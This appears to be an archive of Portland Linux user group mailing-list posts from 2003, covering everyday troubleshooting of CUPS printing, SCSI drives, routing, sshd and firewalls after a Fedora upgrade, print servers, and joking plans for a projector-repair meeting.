Zot's Ancient-Behemoth(tm) projector.  Anybody here good at spot welding?

Keith,

  My boat mechanic is. Gas and electric. I can do gas soldering, use a
cutting torch and electrical spot weld. But, it's been more than 20 years
since I did any structural welding (building a couple of wood burning
stoves) so I won't claim competence.

Indeed. This model was apparently aimed at being sold to
schools and government agencies apparently. Wonder of
wonders. . .

Sounds like a bad power supply or cooling fan (maybe one that is
spinning, but not spinning fast enough).

Possible, but they usually leave the power light on or blinking or
something to indicate that it isn't totally dead.

Good Luck,

Yeah, I used to be pretty good, too bad I don't have a wire feed arc
welder.  Does it have to be welded, would solder work just as well (I do
have solder equipment)?

Hope I can help,

Note in particular, Targe 2 and it's pathetic transfer speeds.  Can
anyone tell me what might be responsible (other than being an old,
wornout device).

By the way, the array stacked in half-height slots makes a quite
effective space-heater and efficacious for drowning out neighboring
jackhammer noise as well.  I tested one of the drives for heat, and
found it too hot to touch, so I pointed an 5-inch AC fan at them and I
think that's got them cooled down a bit.

Also interesting, according to bonnie, I found that the IDE drive in
the box outperforms the 9gig SCSI.

Wait... that's the 7899.

The 7880 is as follows:

But that's just the cdrom.

I haven't noticed a significant amount of heat on the first array.

Subject: [PLUG] Openoffice question
Message-ID: <BAY9-F4xR63a99Ss0je00007a96@hotmail.com>

Dear All:

I have created an MS word document using one of the templates
that come with MS Word (the resume template).

When I opened it with OpenOffice, with both the 1.0.2 and 1.1 version,
the document format is all messed up.  IT shows the grid of the template
and the texts could be in a different cell and all misaligned.

Is there a special way to open up MS Word document that was created
using an MS Word template?  Or is there just no way to read in a document
like that in OpenOffice?

Thanks for any tip.

Hello Linux folkz,
I've rsync'ed my existing Linux installation on
a SCSI hard drive, which I want to install into
another compatible SCSI system under different SCSI ID.
My question is what do I have to change in replicated 
hard drive installation, except mount points in /etc/fstab
file, in order to connect it to the SCSI controller under 
different SCSI ID?

Many thanks in advance,

Message-ID: <20031219141836.1efb6b2b.rdought@pacifier.com>

First question:  I put a D-Link DI-604 router/firewall between my home network and DSL modem.  Although I can get outside and connect to my ISP, the performance on my linux machine is really compromised.  I get a significant delay resolving host names.  To make the connection, I set up the router (192.168.0.1) as the gateway.  It seems that I've missed one of the settings somewhere.  This wasn't a problem without the DI-604.  I've also connected a Mac to the router, which doesn't have the delay--but I didn't have to specify a gateway, the connection was there when I turned on the machine.  Any thoughts on how to resolve the delay problem would be greatly appreciated.

Second question:  Is there a simple method to share files and printers between the Linux and Mac (System 9.1) boxes?  I found a couple of obscure references through Google, but could use something more solid.  Are there some good resources out there?

Thanks.

The SCSI bus has nothing to do with the data on the drive.

OK,
What if on the first system that hard drive had SCSI ID 3 on the
second SCSI channel, and it was recognized as /dev/sdf. 
On another system It'll have SCSI ID 0 on the first SCSI channel and
it's gonna be /dev/sda.

What should be changed in system configuration files to accomodate
this change?  

Regards,

Alex

vincent,

  Did you open the winWord _template_ as an OO.o _template_ or _document_?
Save the template as a template, then save a copy as another name, but as a
document.

Possibly there was either a CDROM or tape drive at that ID on the SCSI 
card and it is remembered.  Go into the SCSI card setup (Ctrl-A?) and set 
it to a more reasonable speed.  Then too it could just be to old!!!  (I've

hello!

You have a real problem here as you will probabvly not see any 
money. These people do not seem to know what they are doing and if 
I really wanted to be vindictive Autodesk has a reputation for 
going after people who use their software without a license. The 
last time I heard about someone using their product this way the 
fine was close to $80,000. I would use the phone, leave a message 
and if thereis no reply I would use the phone again to call 
Autodesk.

Thanks,

Dale

You will need to make it bootable.  rsync moves the contents of the
partitions, but it does not move boot blocks.  Lilo or grub?

I have only seen one that supports a type III PCMCIA slot.  (Or two type
II.)

They don't work very well on some BIOSes. (IRQ brain damage.)

If anybody happens to be looking for one, I have an ISA PCMCIA adapter. 
I had to install it in a desktop system I recently upgraded back when
the only readers for Sony Memorysticks were PCMCIA cards.. no USB cards.

I'm not sure if it's PCMCIA type II or III or what... never did figure
that stuff out.  :-)

OK, we have the technology.  I think.  The lamp assemblies in projectors
get close to red hot, certainly hot enough to melt solder, hence the
need to do small spot welds.  Probably a couple of 1mm wires, some
rivets, and a jury rigged holding clip or two.  We will need measurements
off Karol's old unit; the diameter of the reflector, an estimate of the
distance from filament to the front of the reflector holder (this will
probably need shims to match) and then a hunt for a <150W metal halide
bulb that uses the same voltage, is cheap, and likely to stay in
production for a while.  

Can we bring welding equipment into Jax's?  :-)

OTOH, this is just another 640x480 unit, same as Zot's machine, and
it also doesn't provide the projector serial id info to the computer,
making X setup painful, so this may not be worth the effort. :-(

You just need to make sure that you're mounting each partition's
filesystem at the proper mount points.

This is all determined in /etc/fstab.

I'm sorry, but that's just petty vengeance.

One does not improve a situation by making others suffer.

If you need to make steps to get your money, fine... that's an unfortunate
situation all around and it's a shame, but it's understandable given the
situation.  But reporting them to some other company just because you got
hurt satisfies only the lowest parts of the heart and mind.

Keith,

  Here's an idea: <http://www.audiovisualizers.com/madlab/lcd_proj.htm>

  We can build a prototype and, if we like the results, build a few more for
those who want them. There are several approaches to DIY lcd projectors on
that Web site so there are lots of choices.

Thanks for your replies.  APM is turned off in the BIOS.  There are two
fans, a power supply fan and a CPU cooling fan, and both rotate well
rather the system is crashed or not.  When the system is crashed, the
power light glows steady, just as it does while the system is running
properly.

Certianly there must be some way to cause Linux to write kernel panic
information to a log file so that it can be retrieved on reboot.  If I
can capture the kernel panic message, wouldn't it mention the code
module that caused the problem?  Wouldn't such a message be helpful in
my troubleshooting?

Sounds like a bad power supply or cooling fan (maybe one that is
spinning, but not spinning fast enough).

Possible, but they usually leave the power light on or blinking or
something to indicate that it isn't totally dead.

Good Luck,

Subject: [PLUG] cups client not able to print
Message-ID: <3FE49CA9.1080104@pobox.com>

I have cups set up on a server machine and it works just fine.  I want 
to set up a client machine as a client to use that printer.  I tried 
using both lpadmin and the web interface and no matter what I do, it 
will not print a test page.  I am using RedHat 9.0 and 
cups-1.1.17-13.3.0.3 on both machines.  Here is what I have done.

I added the line "ServerName cupsserver.mydomain.com" to 
/etc/cups/client.conf on the client machine.

Then I went to http://localhost:631 on the client machine (is that 
right?) and tried every way I could think of entering data to add the 
printer on my server so that I can print to it from my client.  Here is 
what I entered into the web form fields.

I set up a printer using the web interface:
Name = HPDeskJet940c
Location = ??? (tried several things including leaving this blank)
Description = HPDeskJet940c
- click Continue
Device = Internet Printing Protocol (ipp)
- click Continue
Device URI = ipp://cupsserver.mydomain.com:631/printers/HPDeskJet940c
- click Continue
Model = HP DeskJet Series CUPS v1.1 (en)
- click Continue

Then I clicked Print Test Page.  Nothing prints out and the client 
machine just sits there.  Everything I read tells me to read all of the 
documentation before asking questions, but the cups documentation tells 
me all of the things that I can do but it is very inadequate at 
explaining *how* to do any of it.  Anyway, I have run out of things to 
read and run out of files to look in and run out of things to randomly 
enter into the web form and it still does not work.

Two things I noticed:
The Device URI on the client keeps changing automatically from ipp to 
http after I entered it.  Not sure if that is normal.
There is an italicized message on the client printer page that says 
"Printer busy; will retry in 10 seconds..."
Nothing happens.

Has anyone set up cups to print from a client on a printer connected to 
a server?  Do you have any suggestions about what I may have overlooked 
or what I haven't tried yet?

Considering the trouble we have to go through to beg/borrow/steal a
projector, it would be worth at least looking at.

Maybe we should take this private.

You are probably bit by the infamous ACL (access control list) bug. All 
Linux boxes on your network should automagically see all of your CUPS 
printers, assuming your networking is correctly set up, because CUPS 
broadcasts itself to the network. Do this:

"In cupsd.conf, find:

<Location />
Order Deny,Allow
Deny From All
Allow From 127.0.0.1
</Location>

Add the local network information using values appropriate for your 
network:

Allow from 192.168.1

Then find the BrowseAddress section and specify the broadcast address:

BrowseAddress 192.168.1.255 "

Maybe one of those tiny acetylene torches for a brazing job instead,

BTW, this is not a bug, but a security feature. :) The bug is in the 
user's manuals at http://localhost:631/documentation.html which don't 
tell you about this.

And remember to restart cups anytime you edit cupsd.conf:
# /etc/init.d/cupsys restart

I have had good success using Netatalk to share files with pre-OS
X Macs. If you can upgrade the Mac to OS X, you could use Samba,
which is a bit easier or at least better documented, but Netatalk
is not that hard to get going, and was very stable when used in an
biz environment.

Lets really make this a fun event. For the next Advanced topics
meeting, to be held ad Jax, lets make the adjenda an upgrade
clinic for projectors.

Someone will need to bring a welder, the larger and more complex
the better. Someone will need to bring a plasma cutter (to cut
the metal). Other things that we will need is a drill press,
a bench with a decent vice and perhaps a bending tool (like
those used for sheet metal bending; they weigh only about
400 to 500 pounds); and any other assorted tools.

We would be setting up a full blown metal shop right there
at our meeting at Jax. Then everyone who wants to can bring
an old projector to upgrade to the new enclosed reflector
bulbs that are now out.

Oops, I forget. Someone would also need to bring in an electronics
shop. The starter and power unit may have to be altered to
use the new bulbs. The firing voltages and timing will be
different. The current would be different. You have to limit
the current to these bulbs, otherwise they can be damange.

Talk about a real advanced topic-hands-on-working meeting.

And I am sure that Jax will not only welcome us back, but
perhaps give us a cut in the prices!

What distribution are you installing?  Red Hat 9 and Fedora will do hard 
  disk installations from the .iso files.  Anaconda mounts the .iso 
files through loopback.

Also, most distributions have all the unpacked files available for 
download.  There are usually more mirrors for the files and they are 
usually quicker to download.

Subject: [PLUG] How can Microsoft get my business?
Message-ID: <r02000200-1032-C25A7FD433E411D89FE9000A959F4BC6@[172.27.1.100]>

Microsoft is distributing two online surveys to Linux User Groups and
Linux users in general, one asking primarily about home computer use,
the other about business use. See:
http://www.newsforge.com/os/03/12/21/1546240.shtml

How can Microsoft get my business? For starters, how about delivering
secure and stable products at a fair price. Then, how about telling the
truth when confronted with product security and stability issues.

Speaking of telling the truth, Microsoft could publish all the secret
application programming interfaces so all vendors could compete fairly
in the market place. Let' not forget about telling the truth when under
oath in a court of law.

Dumping their long time PR company for one that doesn't seem to view
truth as the enemy, and dumping Steve Balmer for someone who seems to
having a conscience, would go a long way in restoring a modicum of
confidence in the company.

So, how can Microsoft get my business? It probably can't. Bill Gates
seems to have made choices early on about security, reliability, and
truth telling. There is no practical way to rectify them now because
they seem to be corner stones of Microsoft company culture. Getting a
culture's head straight is a very difficult, if not an impossible task.

In my opinion, the fundamental problem facing Microsoft isn't a
technology one but a human one. I don't think any amount of money, or
training, or engineering will fix it.

You're thinking small, dude.  Sheet metal is for wimps.  High temperature
casting is where it's at.  We need to bring our own electric arc 
steel mini-mill (Jax might object to coal fired) with overhead ladles
and tempering ovens.  Okay, maybe a 500 foot rolling stand for the
wusses that still crave sheet metal, but they have to roll it themselves!
We will need glass ovens, refractory crucibles, argon filling stations.
Perhaps we can build a spur off the Max tracks into Jax, and move the
larger equipment in that way.  The Willamette is close by for cooling
water.   Open source?  Heck, we'll have open hearth!

With all that tooling, we can forgo computer projection entirely, and
use giant numerically controlled 5 axis milling machines to carve our
presentations into large steel plates, which we haul past the front of
the room on reinforced gondola cars.  Is there an XFree driver for 
multiaxis milling machines?

Finally, we will have something louder than that damned fan in the back
of the room.  ;-)

Subject: [PLUG] USB->serial converter, Part II
Message-ID: <Pine.LNX.4.56.0312211439300.2648@salmo.appl-ecosys.com>

  At yesterday's clinic Dan helped me get to the point where the converter
is recognaized. (The problem is that the USB bus was not always loading
during the boot process.) So when I now look at /proc/bus/usb/devices, there
is the USB->serial converter. But, the light on the converter stays off;
perhaps it should light only when data flow across the connection.

  I have a symlink /dev/photopc --> /dev/ttyUSB1. But, I cannot get the
software to recognzize the port. I tried pointing /dev/photopc at both ttyS0
and ttyS1 with equal lack of success.

  Two questions:

  1) How do I determine the device name of the port being used by the
USB->serial converter?

  2) Is there another technique I can use to test this converter and see why
it's not working?

Thanks,

Rich

  This one has me really puzzled and I've not yet been able to figure it out
myself.

  My notebook used to have no problems connecting to the Web -- or pinging
-- external hosts. Today I can ping internally but not externally. When I
try to use mozilla to reach google I see: "connect: network not reachable".

  ifconfig shows that eth0 is up. "route -n" shows, for eth0, "192.168.55.0
0.0.0.0 255.255.255.0 U 0 0", /etc/resolv.conf has:

search aracnet com # doesn't matter if I add appl-ecosys.com in front
nameserver 192.168.55.1

  All the possible places look correct to me, but I cannot get out. Any
thoughts are appreciated.

Have you tried pinging your DNS server to see if it is up?  Could be
your DNS is down thus you can't ping by hostname but can by IP.  Worth
at try at least.

1. On the notebook, run

     route -n | grep UG

   You should see the ip address of your gateway machine.

2. On the gateway machine (is it a Linux box?), make sure that you're
   forwarding packets:

     /sbin/sysctl net.ipv4.ip_forward

   It should contain a value of 1. If it's 0 (zero), then something's
   wrong.

Oh, I guess I should ask the prior question: can other hosts on your
network successfully get to misc. sites on the wider Internet?

I've been trying to train myself to use the /sbin/sysctl interface
rather than script directly into /proc. Admittedly, it's a matter of
style, not substance. My gut feeling is that it'll protect me from
myself, esp.  when doing writes.

Plus, I tend to use 'sysctl -a' when trying to remember exactly where
something is in /proc, e.g.,

  [heinlein]$ sysctl -a 2>/dev/null | grep forw
  net.ipv4.conf.eth0.mc_forwarding = 0
  net.ipv4.conf.eth0.forwarding = 0
  net.ipv4.conf.lo.mc_forwarding = 0
  net.ipv4.conf.lo.forwarding = 0
  net.ipv4.conf.default.mc_forwarding = 0
  net.ipv4.conf.default.forwarding = 0
  net.ipv4.conf.all.mc_forwarding = 0
  net.ipv4.conf.all.forwarding = 0
  net.ipv4.ip_forward = 0

There it is, the last one! It keeps me from spelunking through /proc.
It's not a hard-and-fast thing, just an inclination.

Cool... I hadn't used it before, I've always just played directly with
proc.

Yeah, I usually just grep a script I know plays with it...

And there we are, the third line.  :-)

sysctl -a sounds like more fun, though... maybe I'll rewrite my firewall

Seems cleaner than running find in proc.

I'd be willing to do this. I have a couple secondhand
contacts, and if it fails, someone can try and hack together
a bulb. They let their support folks take units home for a
couple days, so perhaps they might be generous. Is plug an
non-profit or something similar? If someone could send me
something that would establish plug's legitimacy (years
around, community projects done, etc) that would be cool.
I'll probably give them a call after the new year, etc. . .
Cheers!

I have a LAN that presently has two computers; the

would take care of this problem, and many of them are
under $100.

Would this be a good idea, or are they a lot of

Message-ID: <20031222041512.GB23270@subtend.net>

I'm trying out this application called Photo Organizer[1].  It is a web/php based app
which uses postgresql as a backend.

I have everything up and running, as I can add photos one at a time just fine.  One
feature that doesn't seem to work is bulk uploads.  This feature allows you to upload a
tar/bzip2/gzip/zip file with photos in it and it will unzip the file and add all the
photos contained to your folder in the webapp.

The problem is the application does not use the file extension, but the http post
file_type.  It fails on my server with any browser (even IE on Windows), but when I sent
my zipfile to the author he was able to post it just fine on his test site.

I'm wondering if apache is misconfigured, or lacking configuration to set the file_type
of a octet stream to the proper mime type?

I have a LinkSys print server.  It works pretty well.  Both Windows and
Linux use it.  The instructions are a little obtuse.  (They assume
Windows.  They could make instructions for Linux quite easily, but they
don't.)  Getting the queues to work right took a little bit of work.

The problem is that all of the print servers i have seen out there
assume parallel printers.  Many of the new printers are USB only.

I saw one at Fry's the other day while I was shopping for a WiFi card
that was USB only... I thought it a bit strange as USB just introduces a
whole other level for things to go wrong, especially on a print server..
but whatever.  :-)

Not that I would suggest anybody go to Fry's unless they absolutely have

I've used HP JetDirect, Netgear NetPrint, and somebody else's NetPrint
500. The instructions are usually geared towards Windoze or Novell, but
there's often enough info there to make educated guesses about Linux
performance. In my experience, one's as good as the next. Some have
HTTP user interfaces, while others have telnet interfaces.

There are parallel, RS232-Serial, USB, and 802.11 wireless-compatible
print servers out there at a variety of prices. Google for Ethernet
Print Server and you'll see a variety. When I last shopped for them,
some manufacturers were warning customers that bi-directional support
of multi-finction (print/scan/fax/copy) is not supported, so these
devices will only print via the network wire.

Watch-out for printer-sharing switches that just happen to use wires
with RJ-45 connectors, but don't actually speak any variety of
Ethernet. Extended Systems makes some of these. I almost bought one at
FreeGeek last week before I remembered that it wasn't really Ethernet.
They're nice for offices that don't want a real network for some
reason, but be careful that you don't buy one of these thinking you're
getting a real Ethernet Print Server.

Two weeks ago I bought an IOGear GPSU01 USB print server from Compusa
for $50 to solve the very same problem. Although I haven't tried it yet,
a Google search on +iogear +linux +"print server" or something similar
turned up enough hits to make me think it will work.  Apparently it's
almost? identical to a Hawking print server. Last week CompUSA (if I
remember correctly) had the Linksys USB print server on sale for about
$50 after rebate.

I saw a linksys parallel print server & router on pdxforsale.com last
Thursday.  It's near the top of this page:
http://www.pdxforsale.com/?day=12-18-2003
Don't know if it's still available.

If you buy one, let us know how it works for you!

I beg to differ. I've always done business with local independent shops. 
I get better service, good advice, and if they don't have something in 
stock, they will get it fast. The trick with the local mom n pop shops 
is to ask. They're not going to have a million items out on the 
shelves. 	It's surprising how deep and inventory they do carry, it's 
just not obvious. Fry's is OK, if driving 40 minutes to save fifteen 
cents is important, and you enjoy playing hide-n-seek with store 
clerks, and you don't mind purchasing re-packaged returns.

Regarding pocket printer servers, they're great. Like Robert said, you 
don't need to fire up a whole entire PC to make the printer available. 
Some of them even have actual Unix/Linux/Samba support. Imagine that.

Specifically you should see something like this:

Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.55.1    0.0.0.0         UG    0      0        0 eth0

Dest of 0.0.0.0 with a genmask of 0.0.0.0 will match any packet (IP
ANDed with 0.0.0.0 is 0.0.0.0, thus the destination)

Gateway is where to send the matching patched which should be your
outbound router.

Not if it's doing NAT on some systems.  Depending on the kernel and kind
of natting/masquerading IP forwarding should be OFF (i.e. if the process
grabs the IP and resends it vs cross the tables).

Most people need this on.  But I doubt it changed.

All,

The feedback from the community about the MWVLUG site has been great.
Thanks to all of you who have helped out!

I need help administrating the MWVLUG (http://www.mwvlug.org) site. It
turns out that I don't always have time to submit stories to as much as
I'd like.  You can help as easily as heading out to the site and
submitting a story (if it's Open Source related I'll probably post it)
or becoming and administrator of the site.

The site gets quite a bit of traffic, actually:

  http://www.gencom.us/cgi-bin/awstats.pl?config=www.mwvlug.org

If you'd like to help out just drop me an email and I'll get you set up.
This goes too for you organizers out there; It'd be nice to see you just
post your event announcements to the site.



Thanks!


Cooper

I don't know how in OO.org, but from the command line it's easy:

  sort -u tab-delimited.txt > no-dupes.txt

Interesting...  I originally did this:

sort | uniq > no-dupes.txt

But that didn't remove the dupes, probably because of the unicode
characters in my file, which is why I was looking into using OOo.  But
"sort -u" did remove the dupes.  Maybe "uniq" doesn't handle unicode yet?
Thanks,

Well not exactly the same.  I short-cut the last discussion after I heard 
what I thought was the important stuff so I have to ask if views on RHL 9 
verses Fedora Core 1 for a server update.

A local not-for-profit has a mostly web server set up but it has been
around for a long time computer wise.  Running RHL 6.x which was the
newest version when installed.

They now need andwant some features that it would take far too much effort 
to get by cobbling them into that old of a version.

Has anyone done a Fedora server install (minimal)?  Is there any 
advantages to falling back to RHL 9?


TIA,
Rod

Subject: [PLUG] kde / x / mouse issues.
Message-ID: <E1AYrLD-0002VM-00@drizzle.pdxlinux.org>

Ok, this is probably a stupid, easily solved problem, but
one that I can't figure out, and I'm kind of going in
circles . . .

The mouse works in X fine (I get the cutesy, yet useless X
cursor) but as soon as kde goes to "initializing periphials"
the xserver crashes. Parts of the error logs below. Full
error logs at
http://loraksus.org/linuxstuff/

I have 2 questions:

1. Is the mouse working / configured properly? I'd say yes
because of the "X" cursor, and didn't have any problems
(i.e. server crashes) before kde was installed. I'd kind of
assume this is some system wide setting, although I'm
probably thinking too much of the windows "1 user/computer"
world.

2. How do I get kde to start without crashing the xserver?
;)

Thanks a lot / in advance / happy non-denominational winter
times ;)

Karol.

Misc stuff:
-----------
I installed via "apt-get install x" followed by "apt-get
install kde" on pretty much a bare debian system (I don't
think I installed anything else by default.)

/dev/input/mice exists, is a link, however if I try to cat
it, I get "No such device"

cat /dev/psaux beeps and puts cool characters on the screen
when I move the mouse, whatever that is worth

I don't see why xf86OpenSerial is being used to access
something on a ps2 port, but I'm assuming it knows what it's
doing. . . (i.e. (**) Configured Mouse: Protocol: "PS/2")

I've tried to make /dev/input/mice a link to /dev/psaux (it
is a ps2 mouse, wasn't sure if this was the right thing to

At this point, assuming that you don't need Red Hat's commercial
support, Fedora and Red Hat 9 are roughly similar: Red Hat will stop
offering errata for both late this spring. Only time will tell if the
FC 1 -> FC 2 upgrade process is relatively stable.

Me, I'd go with Fedora, but it's an arguable decision.

Redhat 9 and Fedora 1 are based on a lot of the same things.  They both
have the new thread library hooks in the kernel, both XFree86 4.3.0,
both are Linux 2.4.x based kernels.

That said, Fedora is the better way to go.  On my system, it runs *much*
better.  (Redhat 9 and my dual Athlon do not quite get along.)  It is
more current and has a few more bugs ironed out.  It includes Postfix
2.x, which Redhat 9 does not.    

It does not have a number of things I want, but those things are missing
in Redhat 9 as well.

Paul, Alan;

Thanks for the input.  My biggest concerns are server oriented.  This 
system currently runs Apache, mySQL, PostgreSQL, sendmail and uses PHP.
They need archiveable mailing lists (mailman) and I don't have the time to 
get minorfish doing that in the manner they want.  They also have a 
-REALLY- old webmail solution (W3Mail I think) and would like something 
more current. (Suggestions? :-)  I may be doing some paying work for 
them and I'll want/need mod_perl for that project.

I have notice a performance difference between RHL 9 and Fedora and I'm 
not afraid of bleeding a little.

Again thanks for the input.

I like SquirrelMail... it does the job well, and IIRC, shipped with RH
8.0.

Fedora Core 1 and Red Hat 9 both ship with SquirrelMail. It's a
no-brainer to set up.

They both ship with mod_perl packages, too.

I've just upgraded from RH 8, fully patched, to Fedora Care 1.

Everything works, except I cannot ssh or samba onto the machine anymore.
I've tweaked samba endlessly, but then it occurs to me that I cannot
ssh, either. I've always used pam to authenticate. 

Has anything changed that I need to tweak now?

Sorry for the obvious, but are sshd and samba running? netstat -tl out
to have an entries for *:ssh, *:netbios-ssn, and *:microsoft-ds.

/etc/pam.d/sshd hasn't changed at all from Red Hat 8.0 to Fedora Core
1; /etc/ssh/sshd_config may be to blame, but that file hasn't changed
much either. I think, but have not verified, that
PAMAuthenticationViaKbdInt was by default set to 'yes' in RH 8 and
defaults to 'no' in FC 1.

Does /var/log/secure offer any clues?

Otherwise, you'll have to fire up sshd in the foreground and see:

  # on the FC 1 host
  /etc/init.d/sshd stop
  /usr/sbin/sshd -d

  # then, on a different host
  ssh you at fedora-host

Keep an eye on the terminal hosting the sshd session on the Fedora
host. There'll probably be some clues in the flotsam.

You should check the local firewall configuration.
redhat-config-securitylevel is the config program; "System Settings",
"Security Level" is the menu item.  The settings may have gotten changed in
the upgrade especially since the interface is different.  You may need to
enable SSH and Samba access or disable the firewall completely.

It looks somewhat like you have two mice configured with X.  Look in
your /etc/X11/XF86Config to see if this is the case.  If so, remove the
mouse setup that is causing you the problem (ie, the one that tries to
use /dev/input/mice unsuccessfully).

Can't help you there, don't use KDE.

Happy Holidays,

    Just want to let people know what is happening with PLUG next month.
The first Thursday of Jan is New Years Day which is a holiday.
Hence, we are trying to schedule the meeting for the second Thursday of
the month.  That will be Jan 8, 2004.  With luck we will have Chris
Jantzen give a presentation on User Mode Linux.

    Also, there could be a room change.  PSU only scheduled our meetings
thru December 2003.  Andy Fraser is working on scheduling us for next
year and everything looks good at this point - but I can't promise where
we will be for sure for a few days.  PSU is working on the schedule.

To reply to myself- yes.

Fedora Core 1 decided that I needed a firewall installed. It also
decided that the firewall needed to close off all tcp traffic on ALL
lower ports.

Once I found that, I removed all rules, and viola, connectivity.

I should have noticed that there was nothing about connections in the
log files, they weren't making it that far...

Message-ID: <Pine.LNX.4.44.0312232034420.7085-100000@sco302.DavidMandel.com>

Allen Montgomery formerly with AllianceInternetSolutions.net
gave or loaned me a huge optical disk jubebox which is now
filling my garage in Portland.  I have sold the garage (and
house and land as well), and need to vacate it SOON.  Unfortunately,
I haven't been able to contact Allen first hand, but I have
made every effort to do so - including contacting his friends
and calling all the "A* Montgomery"s in the Portland phone book.

Thus, I'm giving the box away to anyone who wants it.

So, if you want a several hundred pound refrigarator sized box
contact me SOON by calling me at 541-730-5285.  (Call me as
I'm not likely to check my email over the holidays.  Call me
anytime - Well, any reasonable hour - but Christmas day is
fine - After all, getting rid of this would be a wonderful
Christmas present.)

The box was designed to store about 100 optical disks and move
them into one of four optical drives.  The whole thing is SCSI.
It has a large robotic arm to move the disks which might be
fun to play with.  Moreover, this box would make a wonderful
conversation piece in any geek's living room.  Unfortunately,
my lovely wife, Nancy, isn't into Geek Art in our living room.

So, if anyone wants it, call me before noon on December 26 at
541-730-5285.  After that, I'm taking it to FreeGeek.org or where
ever - assuming I can find a pickup and manpower to haul it away.

Message-ID: <20031224090155.53327.qmail@web9603.mail.yahoo.com>

I installed SuSE 9.0 on my system, which uses an
add-on Promise Ultra100 TX2 drive controller, but not
Red Hat. Both distributions pause when unable to copy
an .rpm properly, but Red Hat just quits, whereas SuSE
asks if you'd like to retry, and ultimately SuSE
copied all but two non-essential files and went on to
completion.

The hard drives on my computer are connected to the
add-on controller, but the ATAPI CD-ROM used for
installation is still connected to the onboard
controller. Could it be that there is a problem when
both controllers are used for the same operation? I
had considered copying the contents of the CD's to the
hard disk and installing from there, something SuSE is
especially well-adapted to, but it proved not to be
necessary. Any computer engineers interested in
addressing these remarks are encouraged to do so.

Anyhow, when I first mentioned this topic perhaps two
months ago--I'm still waiting for my rebates for the
160-GB drive--some members of this list expressed the
hope that I would report my experiences to them. Jeme
is apparently right, excessive difficulties should not
be expected with these devices.

In-Reply-To: <r02000200-1032-C25A7FD433E411D89FE9000A959F4BC6@[172.27.1.100]>
Message-ID: <Pine.LNX.4.44.0312240204190.11063-100000@sco302.DavidMandel.com>

I'm looking thru my mail for this survey.
Zot sent a copy of it to me, and I was going to forward it to the
group, but I forgot.  Maybe Zot will.  It might be nice to give
Microsoft some help with this as it would be nice to see them
produce better software.

>From my point of view, Microsoft (and others) don't understand a
number of issues which affect my software selections.  These include:

    (1)  I have often worked on proto-type or startup projects for
         my employers and/or clients.  Usually, I have been paid a
         decent salary, but given little or no budget to work with.
         Thus, I often need to build a proto-type using borrowed
         or sourged hardware, software, data, etc.  Most proprietary
         software is difficult to use in this situation.  Many
         packages are available on a 30 day evaluation basis, but
         I'm likely to need it for six months.  Moreover, I can't
         afford to buy expensive risky software for a project like this.
         I mean, if I convince a client to buy an expensive package
         and it doesn't work out - I'm screwed.  It is much simplier
         and safer to stick to free (as in no cost) software.

         The funny thing is that altho these projects start out
         on a shoe string, they can develop into big buck projects.
         I've done projects where we had absolutely no budget until
         we could prove we had a workable procedure; and then the
         client was willing to spend millions of dollars refining
         and using the procedures.

    (2)  Another issue I have is that I often want to add features
         to the software, and I have often found my ability to do
         this limited with proprietary software.  I haven't really
         tryed to do this with Microsoft software, but I have had
         problems with other proprietary software where the vendor
         gives one access to stupid scripting languages to add
         features, but doesn't give one access to their C level
         libraries.  The scripting languages work fine for adding
         trivial user interface features, but they are worthless
         when it comes to numerical or data representation issues.
         Yet, this is really where I made my reputation in GIS.

    (3)  Along similar lines, I just don't trust software I can't see.
         This isn't just an issue with Microsoft software.  It is
         an issue with nearly all proprietary software; especially
         mathematical and security software.  I get annoyed when I'm
         suppose to use a statistical package or GIS package that
         doesn't even document the algorithms they use or the expected
         numerical errors or anything else.  I guess they want you
         to BLINDLY TRUST their software.  I'm too much of a
         mathematician for that.  I don't even trust my own software.

These are a few of the issues I have with proprietary software in
general.  I recall I few years ago when I was asked to shift my work
from a combination of Open and Closed source software on Unix to
things like ArcInfo and ArcView on Windows NT.  I found the new
environment limiting and extremely frustrating.  I eventually
left GIS and part of the reason was because I didn't think I could
use my best skills effectively in this new environment.

Again, I've got one of those controllers and it's in my fileserver which
is a Linux From Scratch system that's been running for a couple of years.

The primary hard disk is on the built-in IDE and the Promise controller
manages two drives on hde and hdg (for software RAID).

I built the operating system from a base Debian installation which was
made from the bf2.4 bootfloppies iso cdrom.

I didn't try to install to the Promise card's drives, but the bootfloppies
kernel did recognize the drives, so I'm sure I could have.

Mike,

  Could this be part of Red Hat/Fedora's strategy to make linux more
avaiable to the masses? If they configure a new installation with no
connectivity and demand a firewall, all without suitable documentation in a
large font, they may be trying to protect themselves, and the rest of us,
from naive users.

  I'm just curious and not trying to make any critical points.

Thanks,

Rich

Why help an illegal (but government-sanctioned) monopoly increase

Rich,

I'd guess that you've got some persistent processes running on ports
901 (swat) and 98 (linuxconf), while having /etc/inetd.conf entries
for them as well.

Try

  netstat -tln | egrep ':(901|98)'

If entries show up there, and I suspect they will, then double-check
which apps are using those ports:

  lsof -i :901
  lsof -i :98

If the COMMANDs are what you'd expect (probably httpd, but I'm unsure
of that), then check /etc/init.d for startup swat and/or linuxconf
startup scripts.

You'll either want to

1) make sure that those init scripts don't get launched at startup, or

2) comment out the entries from /etc/inetd.conf

Am I making any sense?

Paul,

  Not only do you make sense, but you taught me how to track down what
caused the messages. I then discovered the reason behind it all.

  Both the undesired processes are at the end of /etc/inetd.conf; past the
line that reads "EOF". Shrug. I normally keep inetd turned off. When I
checked the atime for /etc/inetd.conf I realized it was the Sunday before I
left on my trip. I turned on inetd so the pop3 server would run and allow my
fiancee to access her e-mail from her laptop in another room. I had
neglected to check /var/log/messages for spurious, unintended processes.

Many thanks -- and happy holidays,

Rich

Subject: [PLUG] Upgrading kernel on Debian
Message-ID: <3FE9D749.4050506@adnap.no-ip.com>

So I scrounged up some old hardware and now I've got a Debian system 
running.  In preparation for putting it out in the 'real world', I tried 
to set up some iptables rules.  Much to my surprise, iptables will not 
run because I'm running a 2.2 kernel.

So I do an apt-cache search kernel, and see a 2.4.18 kernel-image 
package ready to be downloaded.  I get it, but when it downloads it 
tells me I need to make some changes to lilo.conf because it is an 
initrd image.  But I don't have a lilo.conf! (even though lilo *is* the 
bootloader)

What is wrong with my system, and how can I upgrade my kernel?

Thanks,
Evan

Really the best way to do it is to download the latest kernel-source
package.  Then read the debian.README.gz file in the doc directory. 
It's very straight forward and it works great.

Be sure to copy the /boot/config-something file to the
/usr/src/kernel-2.4.x/.config file so you start with a know good kernel
config.

David,

  I have a rather large pickup truck with a loading ramp I bought to move a
copier for someone. If you can round up a collection of strong geeks we
could probably winch your optical jukebox on and off the truck bed. The ramp
